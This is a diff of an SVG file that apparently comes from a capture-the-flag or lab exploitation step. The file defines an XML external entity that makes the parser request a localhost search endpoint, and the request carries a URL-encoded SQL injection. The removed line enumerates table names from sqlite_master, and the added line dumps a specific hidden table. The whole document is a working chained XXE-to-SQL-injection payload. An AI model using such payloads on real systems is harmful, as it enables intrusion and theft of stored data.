@@ -1,5 +1,5 @@
 <!DOCTYPE svg [
-<!ENTITY xxe SYSTEM "http://localhost:8001/search?q=%27%20UNION%20SELECT%20sql,1%20FROM%20sqlite_master%20WHERE%20name%20LIKE%20%27_%25%27--">
+<!ENTITY xxe SYSTEM "http://localhost:8001/search?q=%27%20UNION%20SELECT%20*%20FROM%20_09ec98688a499f12--">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
   <text>&xxe;</text>
